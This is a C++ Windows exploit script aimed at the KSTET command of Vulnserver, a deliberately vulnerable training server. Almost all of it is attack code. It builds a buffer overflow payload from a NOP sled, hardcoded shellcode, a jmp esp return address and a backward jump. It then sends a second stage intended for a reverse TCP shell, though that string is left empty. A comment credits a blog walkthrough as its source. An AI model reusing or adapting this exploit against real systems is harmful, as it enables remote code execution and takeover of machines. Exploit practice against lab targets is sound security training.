#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <string>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>


#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_PORT "9999"
#define DEFAULT_BUFLEN 512

void completionBuf(std::string& message, char ch, int number)
{
    for (int i = 0; i < number; ++i)
        message += ch;
}

int main(int argc, char* argv[])
{
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;
    const char* sendbuf = "this is a test";
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo("ip", DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }

    std::string message = "KSTET ";
    std::string shellCode = 
        "\x83\xec\x64\x31\xff\x31\xdb\x53\x80\xc7\x04\x53"
        "\x89\xe3\x83\xc3\x64\x53\x47\x57\xb8\x90\x2c\x25"
        "\x40\xc1\xe8\x08\xff\xd0\x85\xc0\x75\xe3";
    std::string reverseTCP =
        "";


    // jmp esp - 0x625011af

    completionBuf(message, '\x90', 8);
    message += shellCode;
    completionBuf(message, '\x90', 70 - 8 - shellCode.size());
    message += "\xaf\x11\x50\x62";
    message += "\xeb\xb5";
    completionBuf(message, 'C', 26 - 2);

    //message += reverseTCP;
    //completionBuf(message, '\x90', 1024 - reverseTCP.size());

    iResult = send(ConnectSocket, message.c_str(), message.size(), 0);
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    std::cout << "\nbytes send " << iResult << "\n\n";

    // Receive until the peer closes the connection
    iResult = recv(ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0);
    if (iResult > 0) {
        printf("Bytes received: %d\n", iResult);
    }
    else if (iResult == 0) {
        printf("Connection closed\n");
    }
    else {
        printf("recv failed with error: %d\n", WSAGetLastError());
    }

    Sleep(3000);

    completionBuf(reverseTCP, '\x90', 1024 - reverseTCP.size());
    message += reverseTCP;

    iResult = send(ConnectSocket, reverseTCP.c_str(), reverseTCP.size(), 0);
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    // источник https://fluidattacks.com/blog/vulnserver-kstet

    closesocket(ConnectSocket);
    WSACleanup();

    system("pause");
}